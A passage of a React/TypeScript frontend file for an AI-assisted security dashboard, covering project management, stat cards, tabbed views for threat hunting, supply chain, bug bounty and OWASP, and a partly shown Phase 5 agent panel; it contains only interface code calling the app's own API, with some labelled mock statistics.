import { useState, useEffect } from 'react'

import { InputSourcesPanel, ThreatHuntPanel, SupplyChainPanel, BugBountyPanel, OWASPPanel } from './panel_components'



// ============ TYPE DEFINITIONS ============

interface Project {

  project_id: string

  name: string

  created_at: string

  findings_count?: number

  critical_count?: number

  high_count?: number

}



interface HealthStatus {

  status: string

  version: string

  providers: string[]

  phase5_enabled?: boolean

}



interface AgentModelConfig {

  [agentId: string]: string

}



interface Finding {

  id: string

  type: string

  severity: 'critical' | 'high' | 'medium' | 'low' | 'info'

  title: string

  description: string

  location?: string

  cwe?: string

  owasp?: string[]

}



interface ThreatAlert {

  id: string

  type: string

  severity: 'critical' | 'high' | 'medium' | 'low'

  title: string

  description: string

  timestamp: string

  iocs?: string[]

  yara_matches?: string[]

}



interface SBOMEntry {

  name: string

  version: string

  license: string

  vulnerabilities: string[]

  risk_score: number

}







// ============ MAIN APP ============

function App() {

  const [view, setView] = useState<'dashboard' | 'models' | 'settings'>('dashboard')

  const [projects, setProjects] = useState<Project[]>([])

  const [health, setHealth] = useState<HealthStatus | null>(null)

  const [loading, setLoading] = useState(true)

  const [currentProject, setCurrentProject] = useState<Project | null>(null)

  const [configuredProviders, setConfiguredProviders] = useState<Set<string>>(new Set())

  const [sidebarCollapsed, setSidebarCollapsed] = useState(false)

  const [notifications, setNotifications] = useState<{id: string, message: string, type: string}[]>([])



  useEffect(() => {

    fetchHealth()

    fetchProjects()

    fetchConfiguredProviders()

  }, [])



  const fetchConfiguredProviders = async () => {

    try {

      const res = await fetch('/api/config/providers')

      const data = await res.json()

      if (data.providers) {

        setConfiguredProviders(new Set(data.providers))

      }

    } catch (e) {

      console.error('Failed to fetch configured providers:', e)

    }

  }



  const fetchHealth = async () => {

    try {

      const res = await fetch('/api/health')

      const data = await res.json()

      setHealth(data)

    } catch (e) {

      console.error('Failed to fetch health:', e)

    }

  }



  const fetchProjects = async () => {

    try {

      const res = await fetch('/api/projects')

      const data = await res.json()

      setProjects(data.projects || [])

    } catch (e) {

      console.error('Failed to fetch projects:', e)

    } finally {

      setLoading(false)

    }

  }



  const createProject = async (name: string) => {

    try {

      const res = await fetch('/api/projects', {

        method: 'POST',

        headers: { 'Content-Type': 'application/json' },

        body: JSON.stringify({ name }),

      })

      const data = await res.json()

      const newProject = { 

        project_id: data.project_id, 

        name: data.name, 

        created_at: new Date().toISOString(),

        findings_count: 0,

        critical_count: 0,

        high_count: 0

      }

      setProjects([...projects, newProject])

      addNotification('success', `Project "${name}" created successfully`)

    } catch (e) {

      console.error('Failed to create project:', e)

      addNotification('error', 'Failed to create project')

    }

  }



  const deleteProject = async (projectId: string) => {

    if (!confirm('Are you sure you want to delete this project?')) return

    try {

      await fetch(`/api/projects/${projectId}`, { method: 'DELETE' })

      setProjects(projects.filter(p => p.project_id !== projectId))

      if (currentProject?.project_id === projectId) {

        setCurrentProject(null)

        setView('dashboard')

      }

      addNotification('info', 'Project deleted')

    } catch (e) {

      console.error('Failed to delete project:', e)

    }

  }



  const addNotification = (type: string, message: string) => {

    const id = Date.now().toString()

    setNotifications(prev => [...prev, { id, message, type }])

    setTimeout(() => {

      setNotifications(prev => prev.filter(n => n.id !== id))

    }, 4000)

  }



  return (

    <div style={{ 

      minHeight: '100vh', 

      background: 'linear-gradient(135deg, #0a0a0f 0%, #0f0f1a 50%, #0a0a0f 100%)',

      color: '#fff',

      display: 'flex'

    }}>

      {/* Notifications Toast */}

      <div style={{

        position: 'fixed',

        top: '20px',

        right: '20px',

        zIndex: 1000,

        display: 'flex',

        flexDirection: 'column',

        gap: '8px'

      }}>

        {notifications.map(n => (

          <div key={n.id} style={{

            background: n.type === 'success' ? '#00ff88' : n.type === 'error' ? '#ff4444' : '#00d4ff',

            color: '#000',

            padding: '12px 20px',

            borderRadius: '8px',

            fontWeight: '600',

            fontSize: '13px',

            boxShadow: '0 4px 20px rgba(0,0,0,0.3)',

            animation: 'slideIn 0.3s ease'

          }}>

            {n.message}

          </div>

        ))}

      </div>



      {/* Sidebar */}

      <aside style={{

        width: sidebarCollapsed ? '70px' : '260px',

        minHeight: '100vh',

        background: 'rgba(15, 15, 26, 0.95)',

        borderRight: '1px solid rgba(255,255,255,0.05)',

        backdropFilter: 'blur(10px)',

        display: 'flex',

        flexDirection: 'column',

        transition: 'width 0.3s ease',

        position: 'fixed',

        left: 0,

        top: 0,

        zIndex: 100

      }}>

        {/* Logo */}

        <div style={{

          padding: '20px',

          borderBottom: '1px solid rgba(255,255,255,0.05)',

          display: 'flex',

          alignItems: 'center',

          gap: '12px',

          overflow: 'hidden'

        }}>

          <div style={{ 

            fontSize: '28px',

            flexShrink: 0

          }}>🛡️</div>

          {!sidebarCollapsed && (

            <div style={{ overflow: 'hidden' }}>

              <h1 style={{ 

                fontSize: '16px', 

                fontWeight: 'bold', 

                background: 'linear-gradient(90deg, #00d4ff, #00ff88)',

                WebkitBackgroundClip: 'text',

                WebkitTextFillColor: 'transparent',

                whiteSpace: 'nowrap'

              }}>

                SENTINEL-X ULTRA

              </h1>

              <span style={{ fontSize: '10px', color: '#666' }}>v0.5.0 • Phase 5</span>

            </div>

          )}

        </div>



        {/* Navigation */}        <nav style={{ flex: 1, padding: '16px 12px' }}>
          <NavItem 
            icon="📊" 
            label="Dashboard" 
            active={view === 'dashboard' && !currentProject} 
            collapsed={sidebarCollapsed}
            onClick={() => { setView('dashboard'); setCurrentProject(null) }}
          />
          <NavItem 
            icon="🤖" 
            label="Models" 
            active={view === 'models'} 
            collapsed={sidebarCollapsed}
            onClick={() => setView('models')}
          />
          <NavItem 
            icon="⚙️" 
            label="Settings" 
            active={view === 'settings'} 
            collapsed={sidebarCollapsed}
            onClick={() => setView('settings')}
          />
        </nav>



        {/* Collapse Toggle */}

        <button 

          onClick={() => setSidebarCollapsed(!sidebarCollapsed)}

          style={{

            margin: '12px',

            padding: '10px',

            background: 'rgba(255,255,255,0.05)',

            border: 'none',

            borderRadius: '8px',

            color: '#666',

            cursor: 'pointer',

            fontSize: '14px',

            transition: 'all 0.2s'

          }}

        >

          {sidebarCollapsed ? '→' : '← Collapse'}

        </button>



        {/* Health Status */}

        {!sidebarCollapsed && (

          <div style={{

            padding: '16px',

            margin: '12px',

            background: 'rgba(0,255,136,0.1)',

            borderRadius: '8px',

            border: '1px solid rgba(0,255,136,0.2)'

          }}>

            <div style={{ fontSize: '12px', color: '#00ff88', marginBottom: '4px' }}>

              ● {health?.status === 'ok' ? 'System Online' : 'System Offline'}

            </div>

            <div style={{ fontSize: '11px', color: '#666' }}>

              {health?.providers?.length || 0} providers • {projects.length} projects

            </div>

          </div>

        )}

      </aside>



      {/* Main Content */}

      <main style={{

        flex: 1,

        marginLeft: sidebarCollapsed ? '70px' : '260px',

        transition: 'margin-left 0.3s ease',

        minHeight: '100vh'

      }}>

        {/* Header */}

        <header style={{

          padding: '20px 32px',

          borderBottom: '1px solid rgba(255,255,255,0.05)',

          display: 'flex',

          justifyContent: 'space-between',

          alignItems: 'center',

          background: 'rgba(10, 10, 15, 0.8)',

          backdropFilter: 'blur(10px)',

          position: 'sticky',

          top: 0,

          zIndex: 50

        }}>          <div>
            <h2 style={{ fontSize: '24px', fontWeight: 'bold', marginBottom: '4px' }}>
              {currentProject ? currentProject.name : 'Security Dashboard'}
            </h2>
            <p style={{ fontSize: '13px', color: '#666' }}>
              {currentProject ? `Project ID: ${currentProject.project_id}` : 'Manage projects and run security analysis'}
            </p>
          </div>

          

          <div style={{ display: 'flex', gap: '12px', alignItems: 'center' }}>

            <button style={{

              background: 'rgba(255,255,255,0.05)',

              border: '1px solid rgba(255,255,255,0.1)',

              color: '#888',

              padding: '10px 16px',

              borderRadius: '8px',

              cursor: 'pointer',

              fontSize: '13px'

            }}>

              🔔 0

            </button>

            <button style={{

              background: 'linear-gradient(135deg, #00d4ff, #00ff88)',

              border: 'none',

              color: '#000',

              padding: '10px 20px',

              borderRadius: '8px',

              fontWeight: '700',

              cursor: 'pointer',

              fontSize: '13px'

            }}>

              + New Scan

            </button>

          </div>

        </header>



        {/* Page Content */}

        <div style={{ padding: '32px' }}>

          {loading ? (

            <LoadingSpinner />

          ) : currentProject ? (

            <ProjectView project={currentProject} onBack={() => { setCurrentProject(null); setView('dashboard') }} addNotification={addNotification} />

          ) : view === 'settings' ? (

            <SetupView configuredProviders={configuredProviders} onProviderConfigured={(providerId) => {

              setConfiguredProviders(prev => new Set([...prev, providerId]))

              addNotification('success', `${providerId} configured successfully`)

            }} />

          ) : view === 'models' ? (

            <ModelConfigView configuredProviders={configuredProviders} />          ) : (

            <DashboardView 

              projects={projects} 

              onCreateProject={createProject} 

              onDeleteProject={deleteProject} 

              onOpenProject={(p) => setCurrentProject(p)}

              health={health}

            />

          )}

        </div>

      </main>



      <style>{`

        @keyframes slideIn {

          from { transform: translateX(100%); opacity: 0; }

          to { transform: translateX(0); opacity: 1; }

        }

        @keyframes pulse {

          0%, 100% { opacity: 1; }

          50% { opacity: 0.5; }

        }

        @keyframes glow {

          0%, 100% { box-shadow: 0 0 20px rgba(0, 212, 255, 0.3); }

          50% { box-shadow: 0 0 40px rgba(0, 212, 255, 0.6); }

        }

      `}</style>

    </div>

  )

}// getViewDescription removed - features now integrated into project tabs



// ============ NAVIGATION ITEM ============

function NavItem({ icon, label, active, collapsed, onClick, badge }: { 

  icon: string; 

  label: string; 

  active: boolean; 

  collapsed: boolean;

  onClick: () => void;

  badge?: string;

}) {

  return (

    <button 

      onClick={onClick}

      style={{

        width: '100%',

        display: 'flex',

        alignItems: 'center',

        gap: '12px',

        padding: collapsed ? '12px' : '12px 16px',

        marginBottom: '4px',

        background: active ? 'linear-gradient(135deg, rgba(0, 212, 255, 0.15), rgba(0, 255, 136, 0.1))' : 'transparent',

        border: active ? '1px solid rgba(0, 212, 255, 0.3)' : '1px solid transparent',

        borderRadius: '10px',

        color: active ? '#00d4ff' : '#888',

        cursor: 'pointer',

        transition: 'all 0.2s',

        justifyContent: collapsed ? 'center' : 'flex-start',

        position: 'relative',

        overflow: 'hidden'

      }}

    >

      <span style={{ fontSize: '18px', flexShrink: 0 }}>{icon}</span>

      {!collapsed && (

        <>

          <span style={{ fontSize: '14px', fontWeight: active ? '600' : '400', flex: 1 }}>{label}</span>

          {badge && (

            <span style={{

              background: 'linear-gradient(135deg, #ff8844, #ff4488)',

              color: '#fff',

              fontSize: '9px',

              fontWeight: '700',

              padding: '2px 6px',

              borderRadius: '4px'

            }}>

              {badge}

            </span>

          )}

        </>

      )}

      {active && (

        <div style={{

          position: 'absolute',

          left: 0,

          top: '50%',

          transform: 'translateY(-50%)',

          width: '3px',

          height: '60%',

          background: 'linear-gradient(180deg, #00d4ff, #00ff88)',

          borderRadius: '0 2px 2px 0'

        }} />

      )}

    </button>

  )

}



// ============ DASHBOARD VIEW ============

function DashboardView({ projects, onCreateProject, onDeleteProject, onOpenProject, health }: {

  projects: Project[];

  onCreateProject: (name: string) => void;

  onDeleteProject: (id: string) => void;

  onOpenProject: (project: Project) => void;

  health: HealthStatus | null;

}) {

  const [newProjectName, setNewProjectName] = useState('')

  const [showDeleteConfirm, setShowDeleteConfirm] = useState<string | null>(null)



  const handleCreate = (e: React.FormEvent) => {

    e.preventDefault()

    if (newProjectName.trim()) {

      onCreateProject(newProjectName.trim())

      setNewProjectName('')

    }

  }



  // Mock stats for demo

  const stats = {

    totalFindings: projects.reduce((sum, p) => sum + (p.findings_count || 0), 12),

    criticalIssues: projects.reduce((sum, p) => sum + (p.critical_count || 0), 3),

    activeProjects: projects.length,

    providersActive: health?.providers?.length || 0

  }



  return (

    <div>

      {/* Stats Cards */}

      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '20px', marginBottom: '32px' }}>

        <StatCard 

          label="Total Findings" 

          value={stats.totalFindings.toString()} 

          icon="🎯"

          color="#00d4ff"

          trend="+12%"

        />

        <StatCard 

          label="Critical Issues" 

          value={stats.criticalIssues.toString()} 

          icon="🚨"

          color="#ff4444"

          trend="+2"

        />

        <StatCard 

          label="Active Projects" 

          value={stats.activeProjects.toString()} 

          icon="📁"

          color="#00ff88"

        />

        <StatCard 

          label="Providers" 

          value={stats.providersActive.toString()} 

          icon="⚡"

          color="#ffaa00"

        />

      </div>



      {/* Quick Actions */}

      <div style={{ 

        background: 'linear-gradient(135deg, rgba(0, 212, 255, 0.1), rgba(0, 255, 136, 0.05))',

        borderRadius: '16px',

        padding: '24px',

        border: '1px solid rgba(0, 212, 255, 0.2)',

        marginBottom: '32px'

      }}>

        <h3 style={{ fontSize: '16px', fontWeight: '600', marginBottom: '16px', color: '#00d4ff' }}>⚡ Quick Actions</h3>

        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(5, 1fr)', gap: '12px' }}>

          {[

            { icon: '🔍', label: 'SAST Scan', desc: 'Static analysis' },

            { icon: '🌐', label: 'Web Scan', desc: 'Vulnerability scan' },

            { icon: '📦', label: 'Dependency', desc: 'CVE check' },

            { icon: '🛡️', label: 'Threat Model', desc: 'Attack analysis' },

            { icon: '📋', label: 'Generate SBOM', desc: 'Bill of materials' }

          ].map((action, i) => (

            <button key={i} style={{

              background: 'rgba(15, 15, 26, 0.8)',

              border: '1px solid rgba(255,255,255,0.1)',

              borderRadius: '12px',

              padding: '16px',

              cursor: 'pointer',

              transition: 'all 0.2s',

              textAlign: 'center'

            }}

            onMouseEnter={(e) => {

              e.currentTarget.style.borderColor = '#00d4ff'

              e.currentTarget.style.transform = 'translateY(-2px)'

            }}

            onMouseLeave={(e) => {

              e.currentTarget.style.borderColor = 'rgba(255,255,255,0.1)'

              e.currentTarget.style.transform = 'translateY(0)'

            }}>

              <div style={{ fontSize: '24px', marginBottom: '8px' }}>{action.icon}</div>

              <div style={{ fontSize: '13px', fontWeight: '600', color: '#fff', marginBottom: '2px' }}>{action.label}</div>

              <div style={{ fontSize: '11px', color: '#666' }}>{action.desc}</div>

            </button>

          ))}

        </div>

      </div>



      {/* Create Project */}

      <div style={{ 

        background: 'rgba(15, 15, 26, 0.95)',

        borderRadius: '16px',

        padding: '24px',

        border: '1px solid rgba(255,255,255,0.05)',

        marginBottom: '32px'

      }}>

        <form onSubmit={handleCreate} style={{ display: 'flex', gap: '16px', alignItems: 'center' }}>

          <input

            type="text"

            value={newProjectName}

            onChange={(e) => setNewProjectName(e.target.value)}

            placeholder="Enter project name to start security analysis..."

            style={{

              flex: 1,

              background: 'rgba(0,0,0,0.3)',

              border: '1px solid rgba(255,255,255,0.1)',

              borderRadius: '10px',

              padding: '14px 18px',

              color: '#fff',

              fontSize: '14px',

              outline: 'none',

              transition: 'border-color 0.2s'

            }}

            onFocus={(e) => e.target.style.borderColor = '#00d4ff'}

            onBlur={(e) => e.target.style.borderColor = 'rgba(255,255,255,0.1)'}

          />

          <button

            type="submit"

            style={{

              background: 'linear-gradient(135deg, #00d4ff, #00ff88)',

              color: '#000',

              border: 'none',

              borderRadius: '10px',

              padding: '14px 28px',

              fontWeight: '700',

              cursor: 'pointer',

              fontSize: '14px',

              display: 'flex',

              alignItems: 'center',

              gap: '8px'

            }}

          >

            <span>+</span> New Project

          </button>

        </form>

      </div>



      {/* Projects Grid */}

      <h3 style={{ fontSize: '18px', fontWeight: '600', marginBottom: '16px', color: '#888' }}>Your Projects</h3>

      {projects.length === 0 ? (

        <EmptyState 

          icon="🎯"

          title="No projects yet"

          description="Create your first project to start security analysis with AI-powered agents"

        />

      ) : (

        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(340px, 1fr))', gap: '20px' }}>

          {projects.map((project) => (

            <ProjectCard 

              key={project.project_id} 

              project={project} 

              onOpen={() => onOpenProject(project)}

              onDelete={() => setShowDeleteConfirm(project.project_id)}

              showDeleteConfirm={showDeleteConfirm === project.project_id}

              onConfirmDelete={() => { onDeleteProject(project.project_id); setShowDeleteConfirm(null) }}

              onCancelDelete={() => setShowDeleteConfirm(null)}

            />

          ))}

        </div>

      )}

    </div>

  )

}



function StatCard({ label, value, icon, color, trend }: { 

  label: string; 

  value: string; 

  icon: string;

  color: string;

  trend?: string;

}) {

  return (

    <div style={{

      background: 'rgba(15, 15, 26, 0.95)',

      borderRadius: '16px',

      padding: '24px',

      border: `1px solid ${color}30`,

      position: 'relative',

      overflow: 'hidden'

    }}>

      <div style={{

        position: 'absolute',

        top: '-20px',

        right: '-20px',

        width: '80px',

        height: '80px',

        background: `${color}15`,

        borderRadius: '50%'

      }} />

      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: '16px' }}>

        <div style={{ fontSize: '32px' }}>{icon}</div>

        {trend && (

          <span style={{

            background: trend.startsWith('+') ? '#00ff8830' : '#ff444430',

            color: trend.startsWith('+') ? '#00ff88' : '#ff4444',

            fontSize: '11px',

            fontWeight: '600',

            padding: '4px 8px',

            borderRadius: '4px'

          }}>

            {trend}

          </span>

        )}

      </div>

      <div style={{ fontSize: '36px', fontWeight: 'bold', color, marginBottom: '4px' }}>{value}</div>

      <div style={{ fontSize: '13px', color: '#666' }}>{label}</div>

    </div>

  )

}



function ProjectCard({ project, onOpen, onDelete, showDeleteConfirm, onConfirmDelete, onCancelDelete }: {

  project: Project;

  onOpen: () => void;

  onDelete: () => void;

  showDeleteConfirm: boolean;

  onConfirmDelete: () => void;

  onCancelDelete: () => void;

}) {

  return (

    <div style={{

      background: 'rgba(15, 15, 26, 0.95)',

      borderRadius: '16px',

      padding: '20px',

      border: '1px solid rgba(255,255,255,0.05)',

      transition: 'all 0.2s',

      cursor: 'pointer',

      position: 'relative'

    }}

    onClick={onOpen}

    onMouseEnter={(e) => {

      e.currentTarget.style.borderColor = 'rgba(0, 212, 255, 0.3)'

      e.currentTarget.style.transform = 'translateY(-2px)'

    }}

    onMouseLeave={(e) => {

      e.currentTarget.style.borderColor = 'rgba(255,255,255,0.05)'

      e.currentTarget.style.transform = 'translateY(0)'

    }}>

      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: '12px' }}>

        <h3 style={{ fontSize: '18px', fontWeight: '600' }}>{project.name}</h3>

        <button 

          onClick={(e) => { e.stopPropagation(); onDelete() }}

          style={{

            background: 'rgba(255,68,68,0.1)',

            border: 'none',

            color: '#ff4444',

            padding: '6px 12px',

            borderRadius: '6px',

            cursor: 'pointer',

            fontSize: '12px'

          }}

        >

          Delete

        </button>

      </div>

      

      <p style={{ fontSize: '12px', color: '#666', marginBottom: '16px' }}>

        Created {new Date(project.created_at).toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' })}

      </p>

      

      <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap' }}>

        <span style={{ 

          fontSize: '11px', 

          background: 'rgba(0, 212, 255, 0.1)', 

          color: '#00d4ff', 

          padding: '4px 10px', 

          borderRadius: '4px',

          border: '1px solid rgba(0, 212, 255, 0.2)'

        }}>

          {project.findings_count || 0} findings

        </span>

        <span style={{ 

          fontSize: '11px', 

          background: 'rgba(255, 68, 68, 0.1)', 

          color: '#ff4444', 

          padding: '4px 10px', 

          borderRadius: '4px',

          border: '1px solid rgba(255, 68, 68, 0.2)'

        }}>

          {project.critical_count || 0} critical

        </span>

        <span style={{ 

          fontSize: '11px', 

          background: 'rgba(0, 255, 136, 0.1)', 

          color: '#00ff88', 

          padding: '4px 10px', 

          borderRadius: '4px',

          border: '1px solid rgba(0, 255, 136, 0.2)'

        }}>

          ● Ready

        </span>

      </div>



      {/* Phase badges */}

      <div style={{ display: 'flex', gap: '6px', marginTop: '12px' }}>

        {['P2', 'P3', 'P4', 'P5'].map(phase => (

          <span key={phase} style={{

            fontSize: '9px',

            background: phase === 'P5' ? 'linear-gradient(135deg, #ff8844, #ff4488)' : 'rgba(255,255,255,0.05)',

            color: phase === 'P5' ? '#fff' : '#666',

            padding: '3px 8px',

            borderRadius: '4px',

            fontWeight: '600'

          }}>

            {phase}

          </span>

        ))}

      </div>



      {/* Delete Confirmation Overlay */}

      {showDeleteConfirm && (

        <div style={{

          position: 'absolute',

          inset: 0,

          background: 'rgba(0,0,0,0.95)',

          borderRadius: '16px',

          display: 'flex',

          flexDirection: 'column',

          alignItems: 'center',

          justifyContent: 'center',

          gap: '12px'

        }}>

          <p style={{ fontSize: '14px', fontWeight: '600' }}>Delete "{project.name}"?</p>

          <div style={{ display: 'flex', gap: '8px' }}>

            <button onClick={(e) => { e.stopPropagation(); onConfirmDelete() }} style={{

              background: '#ff4444',

              color: '#fff',

              border: 'none',

              padding: '8px 16px',

              borderRadius: '6px',

              cursor: 'pointer',

              fontSize: '12px'

            }}>

              Confirm

            </button>

            <button onClick={(e) => { e.stopPropagation(); onCancelDelete() }} style={{

              background: 'rgba(255,255,255,0.1)',

              color: '#888',

              border: 'none',

              padding: '8px 16px',

              borderRadius: '6px',

              cursor: 'pointer',

              fontSize: '12px'

            }}>

              Cancel

            </button>

          </div>

        </div>

      )}

    </div>

  )

}



function EmptyState({ icon, title, description }: { icon: string; title: string; description: string }) {

  return (

    <div style={{

      textAlign: 'center',

      padding: '80px 40px',

      background: 'rgba(15, 15, 26, 0.95)',

      borderRadius: '16px',

      border: '1px dashed rgba(255,255,255,0.1)'

    }}>

      <div style={{ fontSize: '64px', marginBottom: '16px' }}>{icon}</div>

      <h3 style={{ fontSize: '20px', marginBottom: '8px' }}>{title}</h3>

      <p style={{ color: '#666', marginBottom: '24px' }}>{description}</p>

    </div>

  )

}



// ============ PROJECT VIEW ============

function ProjectView({ project, onBack, addNotification }: { 

  project: Project; 

  onBack: () => void;

  addNotification: (type: string, message: string) => void;

}) {

  const [activeTab, setActiveTab] = useState<'overview' | 'input' | 'analysis' | 'agents' | 'threat-hunt' | 'supply-chain' | 'bug-bounty' | 'owasp' | 'findings'>('overview')

  const [agentOutput, setAgentOutput] = useState<string>('')

  const [runningAgent, setRunningAgent] = useState<string | null>(null)

  const [selectedPhase5Agent, setSelectedPhase5Agent] = useState<string>('threat_intelligence')



  const runAgent = async (agentType: string, action: string, inputData: any) => {

    setRunningAgent(agentType)

    setAgentOutput('Initializing agent...')

    try {

      const res = await fetch(`/api/projects/${project.project_id}/agents/${agentType}`, {

        method: 'POST',

        headers: { 'Content-Type': 'application/json' },

        body: JSON.stringify({ action, input_data: inputData }),

      })

      const data = await res.json()

      setAgentOutput(JSON.stringify(data, null, 2))

      addNotification('success', `${agentType} completed successfully`)

    } catch (e) {

      setAgentOutput(`Error: ${e}`)

      addNotification('error', `Agent ${agentType} failed`)

    } finally {

      setRunningAgent(null)    }
  }

  const tabs = [
    { id: 'overview', label: 'Overview', icon: '📊' },
    { id: 'input', label: 'Input Sources', icon: '📥' },
    { id: 'analysis', label: 'Analysis', icon: '🔍' },
    { id: 'agents', label: 'Agents', icon: '🤖' },
    { id: 'threat-hunt', label: 'Threat Hunt', icon: '🔍' },
    { id: 'supply-chain', label: 'Supply Chain', icon: '📦' },
    { id: 'bug-bounty', label: 'Bug Bounty', icon: '🎯' },
    { id: 'owasp', label: 'OWASP', icon: '📋' },
    { id: 'findings', label: 'Findings', icon: '🎯' },
  ]



  return (

    <div>

      {/* Back Button and Title */}

      <div style={{ display: 'flex', alignItems: 'center', gap: '16px', marginBottom: '24px' }}>

        <button onClick={onBack} style={{

          background: 'rgba(255,255,255,0.05)',

          border: '1px solid rgba(255,255,255,0.1)',

          color: '#888',

          padding: '10px 16px',

          borderRadius: '8px',

          cursor: 'pointer',

          fontSize: '13px',

          transition: 'all 0.2s'

        }}

        onMouseEnter={(e) => { e.currentTarget.style.borderColor = '#00d4ff'; e.currentTarget.style.color = '#00d4ff' }}

        onMouseLeave={(e) => { e.currentTarget.style.borderColor = 'rgba(255,255,255,0.1)'; e.currentTarget.style.color = '#888' }}>

          ← Back

        </button>

        <div>

          <h1 style={{ fontSize: '28px', fontWeight: 'bold', marginBottom: '4px' }}>{project.name}</h1>

          <p style={{ fontSize: '12px', color: '#666' }}>Project ID: {project.project_id}</p>

        </div>

      </div>



      {/* Tab Navigation */}

      <div style={{ 

        display: 'flex', 

        gap: '8px', 

        marginBottom: '24px', 

        borderBottom: '1px solid rgba(255,255,255,0.05)', 

        paddingBottom: '16px',

        overflowX: 'auto'

      }}>

        {tabs.map(tab => (

          <button key={tab.id} onClick={() => setActiveTab(tab.id as any)}

            style={{

              background: activeTab === tab.id 

                ? 'linear-gradient(135deg, rgba(0, 212, 255, 0.2), rgba(0, 255, 136, 0.1))' 

                : 'transparent',

              color: activeTab === tab.id ? '#00d4ff' : '#888',

              border: activeTab === tab.id ? '1px solid rgba(0, 212, 255, 0.3)' : '1px solid transparent',

              padding: '12px 20px',

              borderRadius: '10px',

              cursor: 'pointer',

              fontWeight: '600',

              fontSize: '14px',

              display: 'flex',

              alignItems: 'center',

              gap: '8px',

              whiteSpace: 'nowrap',

              transition: 'all 0.2s'

            }}>

            <span>{tab.icon}</span> {tab.label}

          </button>

        ))}

      </div>



      {/* Tab Content */}

      {activeTab === 'overview' && (

        <OverviewTab project={project} />
      )}
      {activeTab === 'input' && (
        <InputSourcesPanel />
      )}
      {activeTab === 'analysis' && (
        <AnalysisPanel projectId={project.project_id} />
      )}
      {activeTab === 'agents' && (
        <AgentsPanel 
          runningAgent={runningAgent} 
          onRunAgent={(agent, action, data) => runAgent(agent, action, data)} 
          output={agentOutput} 
        />
      )}
      {activeTab === 'threat-hunt' && (
        <ThreatHuntPanel />
      )}
      {activeTab === 'supply-chain' && (
        <SupplyChainPanel />
      )}
      {activeTab === 'bug-bounty' && (
        <BugBountyPanel />
      )}
      {activeTab === 'owasp' && (
        <OWASPPanel />
      )}
      {activeTab === 'findings' && (

        <FindingsPanel />

      )}

    </div>

  )

}



function OverviewTab({ project }: { project: Project }) {

  return (

    <div>

      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '16px', marginBottom: '32px' }}>

        <StatCard label="Findings" value="12" icon="🎯" color="#00d4ff" />

        <StatCard label="Critical" value="3" icon="🚨" color="#ff4444" />

        <StatCard label="High" value="5" icon="⚠️" color="#ff8844" />

        <StatCard label="Medium" value="4" icon="📋" color="#ffaa00" />

      </div>



      <div style={{ display: 'grid', gridTemplateColumns: '2fr 1fr', gap: '24px' }}>

        {/* Recent Activity */}

        <div style={{ 

          background: 'rgba(15, 15, 26, 0.95)',

          borderRadius: '16px',

          padding: '24px',

          border: '1px solid rgba(255,255,255,0.05)'

        }}>

          <h3 style={{ fontSize: '16px', fontWeight: '600', marginBottom: '16px' }}>Recent Activity</h3>

          <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>

            {[

              { time: '2 min ago', action: 'SAST Scan completed', status: 'success', details: '12 findings' },

              { time: '15 min ago', action: 'Threat Modeling run', status: 'success', details: '3 attack paths' },

              { time: '1 hour ago', action: 'Dependency scan', status: 'warning', details: '5 vulnerabilities' },

              { time: '2 hours ago', action: 'Project created', status: 'info', details: project.name },

            ].map((item, i) => (

              <div key={i} style={{

                display: 'flex',

                alignItems: 'center',

                gap: '12px',

                padding: '12px',

                background: 'rgba(0,0,0,0.2)',

                borderRadius: '8px'

              }}>

                <div style={{

                  width: '8px',

                  height: '8px',

                  borderRadius: '50%',

                  background: item.status === 'success' ? '#00ff88' : item.status === 'warning' ? '#ffaa00' : '#00d4ff'

                }} />

                <div style={{ flex: 1 }}>

                  <div style={{ fontSize: '13px', fontWeight: '500' }}>{item.action}</div>

                  <div style={{ fontSize: '11px', color: '#666' }}>{item.details}</div>

                </div>

                <div style={{ fontSize: '11px', color: '#666' }}>{item.time}</div>

              </div>

            ))}

          </div>

        </div>



        {/* Quick Stats */}

        <div style={{ 

          background: 'rgba(15, 15, 26, 0.95)',

          borderRadius: '16px',

          padding: '24px',

          border: '1px solid rgba(255,255,255,0.05)'

        }}>

          <h3 style={{ fontSize: '16px', fontWeight: '600', marginBottom: '16px' }}>Security Score</h3>

          <div style={{ 

            display: 'flex', 

            alignItems: 'center', 

            justifyContent: 'center',

            flexDirection: 'column',

            padding: '20px'

          }}>

            <div style={{

              width: '120px',

              height: '120px',

              borderRadius: '50%',

              background: 'conic-gradient(#00ff88 0deg 70deg, #1a1a2e 70deg 360deg)',

              display: 'flex',

              alignItems: 'center',

              justifyContent: 'center',

              marginBottom: '16px'

            }}>

              <div style={{

                width: '100px',

                height: '100px',

                borderRadius: '50%',

                background: '#0a0a0f',

                display: 'flex',

                alignItems: 'center',

                justifyContent: 'center',

                fontSize: '28px',

                fontWeight: 'bold',

                color: '#00ff88'

              }}>

                72

              </div>

            </div>

            <div style={{ fontSize: '14px', color: '#00ff88', fontWeight: '600' }}>Good Security Posture</div>

            <div style={{ fontSize: '12px', color: '#666', marginTop: '4px' }}>Based on 12 findings</div>

          </div>

        </div>

      </div>

    </div>

  )

}



// ============ PHASE 5 PANEL ============

function Phase5Panel({ projectId, selectedAgent, onSelectAgent }: {

  projectId: string;

  selectedAgent: string;

  onSelectAgent: (agent: string) => void;

}) {

  const phase5Agents = [

    { id: 'threat_intelligence', name: '🔍 Threat Intelligence', description: 'YARA rules, IOC enrichment, threat tracking', color: '#ff8844' },

    { id: 'security_operations', name: '🛡️ Security Operations', description: 'SIEM integration, SOAR playbooks', color: '#00d4ff' },

    { id: 'adaptive_defense', name: '⚡ Adaptive Defense', description: 'ML anomaly detection, self-healing', color: '#aa88ff' },

    { id: 'supply_chain', name: '📦 Supply Chain', description: 'SBOM generation, license compliance', color: '#00ff88' },

    { id: 'api_security', name: '🔗 API Security', description: 'OpenAPI analysis, fuzzing, auth testing', color: '#ffaa00' },

  ]



  const [phase5Output, setPhase5Output] = useState<string>('')

  const [runningPhase5, setRunningPhase5] = useState<string | null>(null)



  const runPhase5Agent = async (agentType: string) => {

    setRunningPhase5(agentType)

